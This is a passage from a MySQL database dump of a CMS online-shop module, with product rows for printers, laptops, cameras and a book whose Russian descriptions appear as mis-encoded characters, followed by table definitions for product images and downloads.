(Ver4.1).&nbsp;<br />\r\nxD-PictureCard 2, xD-PictureCard Type M 2, xD-PictureCard Type H 2, Memory Stick Micro 2, RS-MMC 2, mini SD Card 2, micro SD 2, mini SDHC Card 2 � micro SDHC 2.<br />\r\n������� ������ ������ � ���� ������		������ ���������� ����������� (����� ���������� ����������� � ���������� ���������� ��� ������� �����������), ������ ������� ����������, ������ �� 35 ���������� �� ����� �����, ������ ���� ����������, ������ DPOF-�����������, ������ ������, ������ ��������, ������ ���������� �� ���������, ������ ���������� ����� ����������, ������ ����������, ������� ID Photo Print, ����� �� ����, �����-���, ������ ���� � ������ �����, ������ ��� �����.<strong><br />\r\n</strong></p>', '��������� ���������', '<p>FA-PR1<br />\r\nGP-501<br />\r\nHR-101N<br />\r\nMP-101<br />\r\nPS-101<br />\r\nSG-201<br />\r\nTR-301</p>', '����������', '<p>���������� FINE<br />\r\n<br />\r\n��������������� Canon ���������� ������������ ����������������� ��������� FINE ��� ����������� ��������� ���������� ������� � ������������� ������� ���������� ������������ ����������. ��� ��������� ��������� Canon ������������ ����� ������� �� ����� �������� ������ � ���������� ���������������� �������� ���������� ����������� � ������ ����������� ����������� ���� � ����������� ������.&nbsp;<br />\r\n<br />\r\n���������� ChromaLife100+&nbsp;<br />\r\n<br />\r\n������������������� ������� ChromaLife100+ ��������� �������� ������������ ����������� ��������� ��������� ���������� FINE �������� Canon, ������������ ���������� Canon � ����� �������� �� ������ ����������. ���������� ������������� 100 ��� ����� ���� ��������� ��� �������� � ������� �������� ����������, ������������ �� ������ PT-101, PR-201, PP-201, SG-201 � GP-501. ����� ����, ���������� ��������� ������� ����� � ������� 30 ��� � ��������� � ����������� ����� � ������� 20 ��� ��� ������������� ������ PT-101, PR-201 � PP-201.<br />\r\n<br />\r\n���������� ���������� ���������� (Single Ink)<br />\r\n<br />\r\n����� ������� ���������� ���������� � ����� �������� ������ ������������ ����������� �������� ������������ ��� ������ �� ������ PP-201, PR-201 � PT-101 �� ��������� � ������� PR-101. ����������� ����������� ������ ������ ������ ��������� ����� ���������� � �����������.&nbsp;<br />\r\n<br />\r\n���������� PT-101 � PR-201<br />\r\n<br />\r\nCanon ��������� ����������� ������������ ���������� � ������ ���������� ���������� �������� �� ����� ������ ����. ���������������� ���������� Photo Paper Pro Platinum PT-101 � ���������� 300 �/�&sup2; ���������� ������� � ������������ ������������ Canon ��������� ����������, � �� ����� ��� ���������������� ���������� Photo Paper Pro II PR-201 ������� ������ PR-101. �������� ������� A4 � 10x15 ��, � ��� ��������������� ��������� &ndash; ������� A3 � A3+.&nbsp;<br />\r\n<br />\r\n������ ���������� �����<br />\r\n<br />\r\n�������� Canon ����� ������ �������� ���������� ��������, ����������� ����������� ����������� �� ���������� �����, � ����� ��������� ��� PIXMA ������ ��������������� ����� ��������� ����������, ���������� �������� �������� � �������. ����� �������, ��� �������������� ������������ ������ � ������ &laquo;2 �� 1&raquo; � &laquo;4 �� 1&raquo;, ����������� � ��������� ������� PIXMA, ������������ �������� ������. ��� ������������ ��������� PIXMA ������������ ��������� ��� ����������� ����������. ��� ������������ ���������� ����������� ����� � ���������� �����������, ����������� ��� �������� ���������. ��� �������� PIXMA ������������� ���������� ����������������� Energy Star</p>', 'TEST 3', '<p>TEST 3...</p>', 3, 'pixma,drucker', 0.00, 0, 999, 1, 11, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (1, 'CP-10001', 1, '1,26', 'Canon i-SENSYS MF8450', 1, 20150.00, 0.00, 'pixima_1.jpg', 'jpg', '', '<p>������� �������� ������������������� ������� &laquo;�� � �����&raquo;, ������� � ����������� � ����: �����, �������, ���� � ������</p>', '<p>�������� Canon ������������ ����� ������ �� ����� ������� ������������������� �������� ��������� ��� �������������� &ndash; i-SENSYS MF8450. ������������������� �������� ���������� &laquo;4 � 1&raquo; MF8450 � ������������ ����������� � ���� ������������� ����� ��������� �������� � �������� ������. MF8450 &ndash; ��������� ���������� ��� �������� ������ �������, ������� �����������, ��������������� � ��������� ���������. ������ � ���������� ���������� ���������� � ���� ��������� ����������� ����������, �������� �������� �������� ���������� ������ � �������������. ��� ��������� &ndash; ������������ ������������������, ���������� ���������, � ����� �������� � ������������ � �������������.</p>\r\n<p></p>', 2.000, 0, '', 1, 1148068800, '��������������', '<ul>\r\n    <li>������� �������� ������������������� ������� &laquo;�� � �����&raquo;, ������� � ����������� � ����: �����, �������, ���� � ������;</li>\r\n    <li>���������� ������� ������ i-SENSYS ������������ �������� ������� ��������������� ��������;</li>\r\n    <li>17 ���./��� � ������� � �����-����� ������;</li>\r\n    <li>����� ������ ������ ����� &ndash; ����� 14 ������;</li>\r\n    <li>���������� ������������� ��������� ��������� ��� ������������� ��������� � �������� ����������� �������: ����������������� � ������ ������ &ndash; ����� 1,2 ��;</li>\r\n    <li>������� �������� ����������� ������� PDF: ������������ �������� � ���� ����������� �����, � ������� �����, ������������ �� ��������-���� ��� USB-����������;</li>\r\n    <li>������� � ������������ TFT-������� � ���������� 3,5 ����� � ������� ������ ���������;</li>\r\n    <li>������������ ������, �����������, ������������, �������� � ��������� ������;</li>\r\n    <li>���������� �������������� ������ ���������� ��� ������������ ������ (ADF) �� 50 ������.</li>\r\n</ul>\r\n<p></p>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, 'pixma,�������', 0.00, 0, 8, 3, 13, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (3, 'CP-10201', 2, '20,21,24', 'Toshiba Satellite A300-148', 1, 23150.00, 0.00, 'nb_toshiba_satellite_a305650.jpg', 'jpg', '', '<p>15,4&quot;, 2.7��, &nbsp;Intel Core 2 Duo 1830���, 1024 Mb DDR2-667MHz, 250 Gb (4200 rpm), SATA, DVD&plusmn;RW (DL), Intel GMA X3100, Bluetooth; Camera (1.3); WiFi (802.11a/b/g)</p>', '<p>���������� Toshiba ���� �������� � 1875 ���� � ������. � 1985 ����, ��������� ��� ������ ������ � ���� ����������� ��������� (������� - �������).       �� 126 ��� ����� ������� �������� ����� ����������������� ����������� � ����� � ����� ���������� ������� �������������� ����������� � ��������������. �������� ����� Portege � Tecra �������������� ������������ ����������� ������� &laquo;���&raquo; ��� ���������� ������� ������������ � ���� �� ����������� ������� �� ����� ������ ��������� ����� �������������� ������������. � ������ 1997 ���� Toshiba ��������� 10 000 000 ������� &ndash; ���������� ������!       �������� Toshiba �������� ������� ������ �������� ���������� � ��������� ������� �������� ����������. Toshiba ������������ � Harman/Kardon � �������������� ������������ ������ ���������, ��� ��������� ����������� ������ ���������� �������� ��� ���������.</p>', 2.700, 0, '', 1, 1130270400, '��������������', '<p><strong>���������:</strong> 	Intel Core 2 Duo 1830 ��� (T5550) <br />\r\n<strong>����:</strong> 	667MHz 2Mb L2 Cache <br />\r\n<strong>����������� ������:</strong> 	1024 Mb DDR2-667MHz <br />\r\n<strong>������� ����:</strong> 	250 Gb (4200 rpm), SATA <br />\r\n<strong>�����:</strong> 	15,4&quot; TFT WXGA ���������� (Glare) <br />\r\n<strong>����������:</strong> 	1280x800 <br />\r\n<strong>����������:</strong> 	Intel GMA X3100, ����������� 128+256�� <br />\r\n<strong>�������� �����: </strong>AC97 2.0 ����������� <br />\r\n<strong>CD ������:</strong> 	DVD&plusmn;RW (DL) <br />\r\n<strong>�����: </strong>C��� 10/100 ����/� (RJ-45); ����� 56 ����/� (RJ-11) <br />\r\n<strong>������������ �����:</strong> 	Bluetooth; Camera (1.3); WiFi (802.11a/b/g) <br />\r\n<strong>�����:</strong> 	4xUSB 2.0; FireWire (IEEE 1394); Line-out; Microphone in; TV-Out (S-video) <br />\r\n<strong>����� ����������: </strong>ExpressCard <br />\r\n<strong>���������� �����:</strong> 	��-�� Windows, ��������� ������� Touch Pad <br />\r\n<strong>�������: </strong>Li-Ion (�� 3 �����) <br />\r\n<strong>���: </strong>2.7 �� <br />\r\n<strong>������ (� � � � �):</strong> 	363 x 267 x 34 �� <br />\r\n<strong>����������� �����������:</strong> 	Microsoft Windows Vista Home Premium <br />\r\n<strong>��������: </strong>2 ���� ������������� �������� ������������� *</p>', '', '<p></p>\r\n<p></p>', '', '&nbsp;', '', '&nbsp;', 1, 'Scaleo,Protector', 0.00, 0, 3, 1, 2, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (4, 'CP-102001', 2, '20,24', 'Acer Extensa 5220-200508Mi', 1, 15850.00, 0.00, 'nb_acer_extensa_5220_200508mi_3.jpg', 'jpg', '', '<p>15,4, 2.9��, Intel Celeron M 2000���, 1024 Mb DDR2-667MHz, 80 Gb (5400 rpm), SATA, DVD&plusmn;RW, Intel GMA 950, WiFi (802.11a/b/g)</p>', '<p>�������� Acer Extensa 5220 ����������� � �������������� ����������� Intel Celeron � ���������� ����� ������ �� ��������� �� ��� ��������������, ���������� � ��������� ��� ������� ���������. ��������������� 15.4&quot; ������� � ���������� Acer CrystalBrite (��������� ������) ������� ������������ ������� ��� ������ � ��������� ������������.&nbsp;<br />\r\n<br />\r\n������� Acer Extensa 5220 ��������� � ������ ������� �������� ������������� � ������� ����������������, ������� ���� ������������������� ������ ����������� �� �� �������� ������.&nbsp;<br />\r\nLX.E8706.029</p>\r\n<p></p>', 2.900, 0, '', 0, 1150315200, '��������������', '<table width="100%" cellspacing="0" cellpadding="0" border="0">\r\n    <tbody>\r\n        <tr>\r\n            <td class="cell-spec">���������:</td>\r\n            <td class="cell-spec">Intel Celeron M 2000&nbsp;��� (CM-550)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">����:</td>\r\n            <td class="cell-spec">533MHz 1Mb L2 Cache</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">�����������&nbsp;������:</td>\r\n            <td class="cell-spec">1024 Mb DDR2-667MHz</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">������� ����:</td>\r\n            <td class="cell-spec">80 Gb (5400 rpm), SATA</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">�����:</td>\r\n            <td class="cell-spec">15,4&quot; TFT WXGA&nbsp;���������� (Glare)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">����������:</td>\r\n            <td class="cell-spec">1280x800</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">����������:</td>\r\n            <td class="cell-spec">Intel GMA 950, ����������� 0+64��</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">�������� �����:</td>\r\n            <td class="cell-spec">AC97 2.0 �����������</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">CD ������:</td>\r\n            <td class="cell-spec">DVD&plusmn;RW</td>\r\n        </tr>\r\n        <!--<tr><td class="cell-spec">\r\n��������:\r\n</td><td class="cell-spec">\r\n</td></tr-->\r\n        <tr>\r\n            <td class="cell-spec">�����:</td>\r\n            <td class="cell-spec">C��� 10/100 ����/� (RJ-45); ����� 56 ����/� (RJ-11)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">������������ �����:</td>\r\n            <td class="cell-spec">WiFi (802.11a/b/g)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">�����:</td>\r\n            <td class="cell-spec">4xUSB 2.0; Fast-IrDa; FireWire (IEEE 1394); Kensington security; Line-in; Line-out; Microphone in; TV-Out (S-video); VGA</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">����� ����������:</td>\r\n            <td class="cell-spec">PCMCIA ��� II + ExpressCard/54; Card Reader 5-�-1 (SD/SD-Pro/MMC/MS/xD)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">���������� �����:</td>\r\n            <td class="cell-spec">��-�� Windows, ��������� ������� Touch Pad</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">�������:</td>\r\n            <td class="cell-spec">Li-Ion	(�� 2 �����)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">���:</td>\r\n            <td class="cell-spec">2.9&nbsp;��</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">������&nbsp;(�&nbsp;�&nbsp;�&nbsp;�&nbsp;�):</td>\r\n            <td class="cell-spec">334�243�28/35&nbsp;��</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">����������� �����������:</td>\r\n            <td class="cell-spec">Microsoft Windows XP Professional RU&nbsp;</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">��������:</td>\r\n            <td class="cell-spec">1 ��� �������� ������������� *</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n<p></p>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 3, 'Scaleo', 0.00, 0, 5, 1, 5, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (8, '0001_PDF', 5, '27', '��������� Java ���������� ������������ 4-� ���', 1, 40.00, 0.00, 'book_1.jpg', 'jpg', '', '<p>��������: 	Thinking in Java (4th Edition). ������: 	������ �. �����: 	���������� ������������. ����: 	Java. ���� ����������������. 4-� �������, 2009 ���, 640 ���., ������ 17x23 �� (70�100/16), ������ �������, ISBN 978-5-388-00003-3</p>\r\n<p></p>', '<p><b>��������: 	Thinking in Java (4th Edition). ������: 	������ �. �����: 	���������� ������������. ����: 	Java. ���� ����������������. 4-� �������, 2009 ���, 640 ���., ������ 17x23 �� (70�100/16), ������ �������, ISBN 978-5-388-00003-3</b></p>\r\n<p>Java ������ ������, �������� �� ���� ������ ��� �� ��������� ��������� �������������, &mdash; ���������� ������ ������ ����� ����� ��� ������� ������ ���������������� � �����.&nbsp;<br />\r\n��� ����� &mdash; � ��������� ����������������: ������ ��� ����� ���������� � ����� ������ ���������� Java � �� �������. ������� ����������� � ������ ����� ����� ����� ���������� ������� � ���, ��� ��� ������������ ��� ������� ������������ �����.<br />\r\n��� �����, ����������� � ��������� �� ���� �����������, �� �������� � �������� ����������� ��������� ��������� ����� ��������� ����� �� ������ ������� ��� ��������������� �� Java.<br />\r\n� ��������� ������� ����� ���������� ��������� ������������� ������������������ Java SE5/6, �������� � ������������ �� �� ���� �����.</p>\r\n<p></p>', 0.000, 1, '/uploads/images/adv_book.gif', 1, 1150315200, '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, '�����,���������������', 0.00, 0, 1000, 3, 0, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (13, 'DKJHHJ1234', 3, '28', 'Digital Ixus 55', 1, 239.00, 0.00, 'canon_1.jpg', 'jpg', '', '����������:  5 Mpx, ���������� zoom:  3x, �������: 2.5'''', �������: 1/2.5'''', ������: SD/MMC, ��� �������: Li-ion. ���� ������: ������ 2005', 'Digital IXI 55 (IXUS 50) &ndash; ����� 5,0-�������������� �������� ������. ��� ������, �������������� ���������� ����� ������� ���������� ���������� ������ Digital IXUS 40, ���������� ������������ �������� �� ����������� �����, � ����� ����� ������� ������ � �� &laquo;������� �������&raquo; &ndash; ������� Digital IXUS 700.', 0.600, 0, '', 0, 1151352000, '��������', '<p><b>�������</b></p>\r\n<ul>\r\n    <li>����� ����� �������� &mdash; 5 ���.</li>\r\n    <li>���������� ������ &mdash; 1/2.5&quot;</li>\r\n    <li>������������ ���������� &mdash; 2592x1944</li>\r\n    <li>���������������� &mdash; 50 - 400 ISO</li>\r\n    <li>������� ��������� ����� &mdash; ����</li>\r\n</ul>\r\n<p><b>������ ������</b></p>\r\n<ul>\r\n    <li>����������� &mdash; ����</li>\r\n    <li>�������� ������ &mdash; 2.1 ����./���</li>\r\n    <li>������ &mdash; ����</li>\r\n</ul>\r\n<p><b>������������ � ��-�����</b></p>\r\n<ul>\r\n    <li>��� ������������ &mdash; ����������</li>\r\n    <li>��-����� &mdash; 115000 ��������, 2.50 ����.</li>\r\n</ul>\r\n<p><b>�����������</b></p>\r\n<ul>\r\n    <li>����������� ���������� ������ &mdash; 0.03 �</li>\r\n</ul>\r\n<p><b>�������</b></p>\r\n<ul>\r\n    <li>������ ������������� &mdash; ���� �����������</li>\r\n    <li>������� ������������ &mdash; 700 ��*�</li>\r\n</ul>\r\n<p><b>������ ������� � �����������</b></p>\r\n<ul>\r\n    <li>������������ &mdash; ����������� Canon Digital IXUS 55, Li-ion ����������� NB-4L, �������� ����������, USB-������, �����������, ����� ������ Secure Digital 16 ��, ������� �� ��������, CD-ROM � ����������� ������������.</li>\r\n    <li>�������������� ���������� &mdash; ����� ��������� ������, 9-�������� ���������������� ����������� AiAF, ���������������� ������ ����������</li>\r\n    <li>���� ������������� &mdash; 2005-08-22</li>\r\n</ul>\r\n<p><b>�������������� �����������</b></p>\r\n<ul>\r\n    <li>������ ������ &mdash; ��������������, ������ ���������, �� ������</li>\r\n    <li>������� &mdash; ����������, �� 3.50 �, ���������� ������� ������� ����</li>\r\n</ul>\r\n<p><b>��������</b></p>\r\n<ul>\r\n    <li>�������� ���������� (35 �� ����������) &mdash; 35 - 105 ��</li>\r\n    <li>���������� Zoom &mdash; 3x</li>\r\n    <li>��������� &mdash; F2.8 - F4.9</li>\r\n</ul>\r\n<p><b>����������</b></p>\r\n<ul>\r\n    <li>�������� &mdash; 15 - 1/1499 �</li>\r\n    <li>������ ��������� �������� � ��������� &mdash; ���</li>\r\n    <li>��������������  &mdash; +/- 2 EV � ����� 1/3 �������</li>\r\n</ul>\r\n<p><b>������ � ����������</b></p>\r\n<ul>\r\n    <li>��� ���� ������ &mdash; SD</li>\r\n    <li>����� ������ � �������� &mdash; 16 ��</li>\r\n    <li>������� ����������� &mdash; 3 JPEG</li>\r\n    <li>���������� &mdash; USB 2.0, �����, �����</li>\r\n</ul>\r\n<p><b>������ ����� � �����</b></p>\r\n<ul>\r\n    <li>������ ����� &mdash; ����</li>\r\n    <li>������������ ���������� ������� &mdash; 640x480</li>\r\n    <li>������������ ������� ������ ����������� &mdash; 30 ������/�</li>\r\n    <li>������ ����� &mdash; ����</li>\r\n</ul>\r\n<p><b>������� � ���</b></p>\r\n<ul>\r\n    <li>������ &mdash; 86x54x22 ��</li>\r\n</ul>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, 'ixxus,foto', 0.00, 0, 1000, 2, 16, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (14, '32esdfvfds', 3, '3', 'Casio EXILIM EX-S600', 1, 3400.00, 0.00, 'casio_2.jpg', 'jpg', '', '&nbsp;��� 1/2,5 ����� (����� 6,18 ��� ��������, 6 ��� �������� ���.) ���������� ���������� ����: 2816x2112 2560x1920 2560x1712 (3:2) 2304x1728 2048x1536 1600�1200 640�480 ��������; ���������� ����� (�� �������� ��������������): 640x480, 320x240', '������ EX-S600, ��������� �������� ����� EXILIM CARD, ��������� ��������� ������ ���������� ������������ ������������, ����������� � ����������, ������ � �������� �����. ���������� �������� ��������, ����������� ����������� ����������� � ����������� ������ ������������ � �������, - ��� ��� ���������� �����, ��� CASIO ����������� ��� �������� ������� ��������������, ������������ ������� � ���������� ���������� ��� ������������ �������, ������� ����� ��������� � ������ ��� �����.', 0.120, 0, '', 0, 1151352000, '��������������', '<ul>\r\n    <li>����������� ����������	&nbsp;- 6,0 ������������</li>\r\n    <li>������������ ������ ������	- 2816x2112</li>\r\n    <li>������� ������������	- ����������� (Anti-Shake DSP)</li>\r\n    <li>�������� ����������	- 38-144 ��</li>\r\n    <li>���������� ���	- 3x</li>\r\n    <li>���������������������	- 50,&nbsp;100, 200, 400, Auto</li>\r\n    <li>��-�������	- 2,4&quot;, 85000 ��������</li>\r\n    <li>����� ������	- SD</li>\r\n    <li>��� ������ � ������ ������� � ����� ������	- 145 �<br />\r\n    </li>\r\n</ul>', '', '<br />', '', '&nbsp;', '', '&nbsp;', 3, '�����������, ��������', 0.00, 0, 1000, 2, 16, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (15, '11112', 22, '2,20,22', 'HP Compaq 530 FH524AA', 1, 20280.00, 0.00, 'hp151111.jpg', 'jpg', '', '<p>�������, Intel Celeron M 530 (1.73 ���), 15.4'''' WXGA (1280x800), 1024 �� (1�DDR2), 120 ��, Intel GMA 950 (up 224 ��), DVD+/-RW, Modem, LAN, Wi-Fi, DOS, 2.7 ��</p>', '<p>������, ����� ��� ������� �� ������� �� �������� ����������� ����������� ��? ����� �� ��������� �� ����������� ������� ������� XGA � ���������� 15,4 �����. ���������� ������, ����� ��� (2,7 ��) � ���������� ������� (������� 31,9 ��) �������� ��� ����� ���� ���� � ����� � ��������� ����� �������!</p>', 2.700, 1, '/uploads/images/adv_hp.gif', 0, 1219780800, '����������� ��������������', '<p>��������� ������� &mdash; 15.4 '''' TFT<br />\r\n���������� ������� &mdash; 1280�800&nbsp;<br />\r\n��������� &mdash; Intel Celeron M&nbsp;<br />\r\n������� ���������� &mdash; 1730 MHz<br />\r\n����� ����������� ������ &mdash; 1024 Mb<br />\r\n����������� ������ &mdash; DDR2&nbsp;<br />\r\n������� ����������� ������ &mdash; 533 MHz<br />\r\n��� ������� ������ (L2C) &mdash; 1024 Kb<br />\r\n������ ����� &mdash; Intel&reg; GMA 950 (shared)&nbsp;<br />\r\n������ ����������� &mdash; 224 Mb<br />\r\n������ &mdash; Intel&reg; i945GM Express&nbsp;<br />\r\n������ �������� ����� &mdash; 120 Gb<br />\r\nCD/DVD ������ &mdash; DVD-Dual DL&nbsp;<br />\r\nWi-Fi &mdash; ����&nbsp;<br />\r\nBlueTooth &mdash; ���&nbsp;<br />\r\n���������� USB-������ &mdash; 2&nbsp;<br />\r\nHDMI &mdash; ���&nbsp;<br />\r\n���������������� ���� (COM) &mdash; ���&nbsp;<br />\r\n������������ ���� (LPT) &mdash; ���&nbsp;<br />\r\nFire-Wire (IEEE 1394) &mdash; ���&nbsp;<br />\r\n�� ������ &mdash; ���&nbsp;<br />\r\n������� ������� &mdash; VGA (D-Sub 15-pin)&nbsp;<br />\r\nPCMCIA ���� &mdash; Type II&nbsp;<br />\r\nExpress Card &mdash; ���&nbsp;<br />\r\nFM/LAN &mdash; Fax-modem 56K, LAN 10/100&nbsp;<br />\r\n�������� ������� &mdash; Conexant Cx20468 ���������� ��������&nbsp;<br />\r\n������ � ������ Tablet PC &mdash; ���&nbsp;<br />\r\n����������� &mdash; Li-Ion&nbsp;<br />\r\n���������� ������ &mdash; 3 ���� 00 �����&nbsp;<br />\r\n�� &mdash; DOS&nbsp;<br />\r\n������ &mdash; 356 mm<br />\r\n����� &mdash; 257 mm<br />\r\n������� &mdash; 35 mm<br />\r\n��� &mdash; 2.7 kg<br />\r\n������ ��������� ������ &mdash; ���&nbsp;<br />\r\n�������� &mdash; 1 ���&nbsp;<br />\r\n�������������� ���������� &mdash; ��������� Kensington Lock &quot;��������� �������&quot;<b><br />\r\n</b></p>', '', '<br />', '', '<br />', '', '<br />', 1, 'hp', 0.00, 0, 3, 2, 1, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (17, 'sdfsdw332', 4, '10,11,12,13', '����� 1by1', 1, 1.00, 0.00, 'player.gif', 'gif', '', '���������, �� �������������� ������������� ����� ������. The Directory Player ������������� MP3 �����, �� � ������� ������������ ������� (dll/plugin) ������������� ����������� ����������� WAV, OGG, MP2 ������� � Audio CD �����.&nbsp;', '���������, �� �������������� ������������� ����� ������. The Directory Player ������������� MP3 �����, �� � ������� ������������ ������� (dll/plugin) ������������� ����������� ����������� WAV, OGG, MP2 ������� � Audio CD �����. ��������� ������ �������� �� �������� ���������� Windows, �.�. � ����� ���� ������������� ������ ������, � � ������ ������������ ����������� �����, ������������� � ��� ��� ���� ����������. ����� ������ ��������� ���������� �� ������� ��� ���������� ����-������ � �������������� ����������� ����� ������ ������������ ��� ����������. ������, ��� ������� ����-������ (Playlist) ��������������. The Directory Player ����� �������� �� ��������� ������ � ������������ ������� ������� (������ ������� ������ �������� � ����� Readme, ������������� � ������ � ����������).&nbsp;', 0.000, 0, '', 0, 1232226000, '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 0, '�����, �����', 0.00, 0, 1000, 2, 3, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (16, '2342342', 23, '2,6,23', 'ASUS F9E PMD-T2370', 1, 25003.00, 0.00, 'nb_asus.jpg', 'jpg', '', '<p>��������� Intel PMD-T2370 (1.73 ���), 12.1\\''\\'' WXGA (1280x800), Intel GMA X3100, 2048 �� DDR II, 160 ��, DVD-RW (Super Multi) DL, 10/100/1000 LAN, �����, 802.11a/b/g, ���������� Web-������, ����� + ���� � ���������</p>', '<p>��������� ��������� ��������� ��������� ��� ��������� ���������� �������������. ����� ����� F9 &ndash; ��� �������� � ���������� ������ 12 ������ �� ���� ������� Intel. � ������ ��������� ����������� ��������������� ������� Intel GMA X3100, ����� �� ���������� �� ������������������ ���������� �������������� �������� ������. ���������� ���������� ������ ������ ������� ����� �������������. ������������� ������ ������ ����� �������� ������������ ���������� WiFi � Bluetooth. ���������������� ���-������ � ������� ������ ������������ ����������� ������� �� ����� ��� � �����, ��� � � ������. � ������������ ���������� ������� ������������ ������ ���������� ������� � ���������� ����������� ���������� ������ TPM. �������� �� �������� ��������, ������� ����� ������������ ������������ ����������� � ������� ������� ��� ��������������� ����� ������� �������� ��������� ������������ ������� HDMI.</p>', 2.100, 0, '', 0, 1220472000, '��������������', '<p><strong>�������������� ��:</strong>	��������� Microsoft&reg; Windows&reg; Vista&trade;,    ��������� Windows&reg; XP<br />\r\n<strong>�������	:</strong> ��������������� ������� TFT � ���������� 12.1&rdquo; � ����������� WXGA (1280�800), ���������� ASUS Color Shine � ASUS Splendid<br />\r\n<strong>���������:</strong>	Intel&reg; Intel&reg; Core&trade; 2 Duo (Merom, Socket P; 65nm; FSB667MHz; 2MB L2 Cache; EIST; XD) | Intel&reg; Pentium&reg; Dual Core (Merom, Socket P; 65nm; FSB533MHz; 1MB L2 Cache; EIST; XD) | Intel&reg; Celeron&reg; M (Merom,Socket P; 65nm; FSB533MHz; 1MB L2 Cache; XD; Intel&reg; 64)<br />\r\n<strong>������: </strong>Mobile Intel&reg; 965GM Express Chipset + ICH8-M<br />\r\n<strong>����������� ������: </strong>DDRII 667���, ����-������ SO-DIMM. ������������ ����� &ndash; 2048�� (2 �����)<br />\r\n<strong>����������� �������:</strong>	��������������� ������� Intel GMA X3100, ���������� ������<br />\r\n<strong>������� ����: </strong>SATA 2.5&rdquo; ������� �� 250�� (�������� �������� 5400/4200 ��/���)<br />\r\n<strong>���������� ������:</strong>	8xDVD-SuperMulti DL � ���������� ������ ����������� ������<br />\r\n<strong>�������� �������: </strong>HD Audio; 2 ��������, ��������<br />\r\n<strong>������������ ����������:</strong>	������� WiFi ��������� 802.11a/b/g/n, ������������ ������ Bluetooth (v2.0+EDR). ������������ ������ 3G/3.5G+SIM card slot<br />\r\n<strong>��������� ����������:</strong>	������� ������� ����� 10/100/1000����/�, ����-����� 56�<br />\r\n<strong>���������������� �����: </strong>3xUSB2.0, ExpressCard34|54, VGA (D-Sub), HDMI, Head-Out/SPDIF, Mic-in (mono), RJ11, RJ45<br />\r\n<strong>����-�����: </strong>SD/MMC/MS/MSPro/xD<br />\r\n<strong>�����������: </strong>���-������ 1.3����� � ����� �������� 240 ��������<br />\r\n<strong>������������:</strong>	������������ ������ ����������� ���������� TPM, ������������ ������ ���������� �������; ������ BIOS, ��������� ������<br />\r\n<strong>��������� �������:</strong> 3	3/6/9 �����, 2400/4800/7800���<br />\r\n<strong>������� �������:</strong>	������������� ������� �������: 19�, 3.42�, 65��/100~240�, 50/60��<br />\r\n<strong>������� ��������:</strong>	310x224x27-34��<br />\r\n<strong>��� ��������	:</strong>2.1�� (� 6-�������� �������)</p>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, '�������,asus,F9E,PMD-T2370', 0.00, 1, 5, 1, 4, '', 1, '', '', '', 0, 0);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_artikel_bilder`
-- 

CREATE TABLE `cp_modul_shop_artikel_bilder` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `ArtId` int(10) unsigned NOT NULL default '0',
  `Bild` char(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_shop_artikel_bilder`
-- 

INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (1, 16, 'nb_toshiba_satellite_a305650.jpg');
INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (2, 14, 'casio_1.jpg');
INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (3, 13, 'canon_2.jpg');
INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (4, 4, 'nb_toshiba_satellite_a3343400_1.jpg');
INSERT INTO `cp_modul_shop_artikel_bilder` VALUES (5, 3, 'nb_toshiba_satellite_a3343400_2.jpg');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_artikel_downloads`
-- 

CREATE TABLE `cp_modul_shop_artikel_downloads` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `ArtId` varchar(255) NOT NULL,
  `Datei` varchar(255) NOT NULL,
  `DateiTyp` enum('full','update','bugfix','other') NOT NULL default 'full',
  `TageNachKauf` mediumint(5) NOT NULL default '365',
  `Bild` varchar(255) NOT NULL,
  `Titel` varchar(200) NOT NULL,
  `description` text NOT NULL,
  `Position` mediumint(3) unsigned NOT NULL default '1',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
